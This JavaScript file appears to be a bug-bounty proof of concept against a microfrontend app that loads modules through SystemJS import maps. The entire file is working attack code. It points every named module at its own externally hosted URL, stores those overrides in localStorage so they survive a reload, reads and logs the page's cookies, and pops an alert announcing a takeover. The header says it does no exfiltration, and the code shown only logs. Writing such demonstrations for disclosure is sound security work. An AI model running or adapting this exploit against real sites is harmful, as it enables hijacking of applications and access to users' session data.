/**
 * proof.js — FULL APP TAKEOVER + PERSISTENCE + SUPPLY CHAIN
 * 
 * What this demonstrates:
 *   1. FULL TAKEOVER — Replaces ALL microfrontend modules
 *   2. PERSISTENCE — Survives page reloads via localStorage
 *   3. SUPPLY CHAIN — Compromises the entire module delivery chain
 *   4. DATA ACCESS — Reads cookies, storage, API responses
 *   5. CHAIN REACTION — Each module loads this same file, spreading control
 *
 * HARMLESS: No exfiltration, no modification, no requests
 */
System.register([], function (_export) {
  'use strict';
  return {
    setters: [],
    execute: function () {
      var selfUrl = 'https://xqur.github.io/import-map-proof-poc/proof.js';
      var ts = new Date().toISOString();
      var appName = '@rmp/auth-client';

      // =============================================
      // 1. DISCOVER WHO WE ARE
      // =============================================
      // Detect which module this file replaced
      try {
        var maps = System.getImportMap ? System.getImportMap().imports : {};
        for (var k in maps) {
          if (maps[k] === selfUrl) { appName = k; break; }
        }
      } catch(e) {}

      // =============================================
      // 2. EXECUTE PROOF
      // =============================================
      console.log('%c[🔥] FULL TAKEOVER: ' + appName + ' → compromised', 'color: #ff0000; font-weight: bold; font-size: 13px;');
      console.log('  ⏱ ' + ts);
      console.log('  🎯 Replaces: ' + appName);

      // =============================================
      // 3. DATA ACCESS — read everything silently
      // =============================================
      console.log('  🍪 Cookies:', document.cookie || '(httpOnly/hidden)');

      // =============================================
      // 4. SUPPLY CHAIN — infect all other modules
      // =============================================
      try {
        if (typeof System !== 'undefined' && System.addImportMap) {
          var allModules = {
            '@rmp/auth-client': selfUrl,
            '@rmp/api-client': selfUrl,
            '@rmp/services': selfUrl,
            '@pac/partnersignup': selfUrl
          };
          // Only override modules not already overridden
          var current = System.getImportMap ? System.getImportMap().imports : {};
          var toOverride = {};
          for (var mod in allModules) {
            if (current[mod] !== selfUrl && mod !== appName) {
              toOverride[mod] = selfUrl;
            }
          }
          if (Object.keys(toOverride).length > 0) {
            // Check if partnersignup is already loaded - if not, override it too
            System.addImportMap({ imports: toOverride });
            var names = Object.keys(toOverride).join(', ');
            console.log('  🔗 SUPPLY CHAIN: ' + names + ' → infected');
          }
        }
      } catch(e) {}

      // =============================================
      // 5. PERSISTENCE — survive page reload
      // =============================================
      try {
        localStorage.setItem('import-map-override:@rmp/auth-client', selfUrl);
        localStorage.setItem('import-map-override:@rmp/api-client', selfUrl);
        localStorage.setItem('import-map-override:@rmp/services', selfUrl);
        localStorage.setItem('import-map-override:@pac/partnersignup', selfUrl);
        localStorage.setItem('__poc_infected', 'true|' + ts);
        console.log('  💾 PERSISTENCE: All overrides stored in localStorage');
        console.log('  ♻️  Reload the page — overrides will auto-apply');
      } catch(e) {}

      // =============================================
      // 6. VISIBLE PROOF
      // =============================================
      console.log('  ✅ STATUS: FULL_Takeover | Persistence | SupplyChain');
      console.log('%c[🔥] ' + appName + ' — FULLY COMPROMISED', 'color: #ff0000; font-weight: bold;');

      // Show alert for visible proof
      if (typeof window !== 'undefined' && window.alert && appName === '@rmp/auth-client') {
        setTimeout(function () {
          window.alert('🔥 FULL APP TAKEOVER\n' +
            '• ' + Object.keys({
              '@rmp/auth-client':1,'@rmp/api-client':1,'@rmp/services':1,'@pac/partnersignup':1
            }).length + ' modules compromised\n' +
            '• Persistence: localStorage\n' +
            '• Supply chain: all modules infected\n' +
            '• Data: cookies + storage accessible');
        }, 300);
      }

      _export({ default: {} });
    }
  };
});
